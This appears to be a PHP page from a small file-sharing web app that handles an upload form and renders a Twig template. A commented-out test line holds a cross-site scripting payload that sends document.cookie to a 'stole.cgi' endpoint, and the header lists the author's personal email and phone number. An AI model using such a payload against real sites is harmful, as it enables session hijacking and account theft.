<?php

    /*
	@@ -=::MATLLE::=-
-----------------------------------------------------------------------------	
	# author: @matlle
	# email: paso.175@gmail.com
	# mobile: (225) 41870768
-----------------------------------------------------------------------------
	@@ Simple is better than complex.
*/

    require_once 'Helper/autoload.inc.php';
    require_once 'initwig.php';
   
    $db = DBFactory::PgDAO();
    $amanager = new AuthorsManager($db);

    $amanager->logged_out_protected();

    $author_id = $amanager->get_session_id();

    //$threat = '<a href="#" onclick="window.location=\'http://localhost:8080/stole.cgi?text=\'+escape(document.cookie); return false;">Click here!</a>';
    //echo htmlspecialchars($threat);

     if (isset($_POST['submit']) && isset($_POST['title']) && isset($_POST['description']) && isset($_FILES['file']) ) {
         
         $manager = new FilesManager($db);

                     
         $file_title =  $_POST['title'];
         $file_description =  $_POST['description'];
         $file_name =  $_FILES['file']['name'];
         $file_type =  $_FILES['file']['name'];
         $file_size = $_FILES['file']['size'];
         $file_ext  = $_FILES['file']['name'];
         $file_tmp_name  = $_FILES['file']['tmp_name'];
         $file_error = $_FILES['file']['error'];

         $file = new Files(array(
                              'file_title' => $file_title,
                              'file_description' => $file_description,
                              'file_name' => $file_name,
                              'file_type' => $file_type,
                              'file_size' => $file_size,
                              'file_ext' => $file_ext,
                              'file_tmp_name' => $file_tmp_name,
                              'file_error' => $file_error,
                              'author_id' => $author_id
                          ));
             
             if ($file->isValid()) {

                $file->set_file_pdf_name($file->get_file_name());
                $file->set_file_thumb_name($file->get_file_name());

                $manager->save_file($file);

                 header('Location: index.php');
                 exit;
             } else {
                
                echo "file is not valid";
             }
        
     }
   
     
     echo $twig->render('file/share.html', array(
              'msg_unread' => $msg_unread,
              'nb_file' => $nb_file,
              'nb_follower' => $nb_follower,
              'nb_following' => $nb_following,
              'author' => $author
          ));
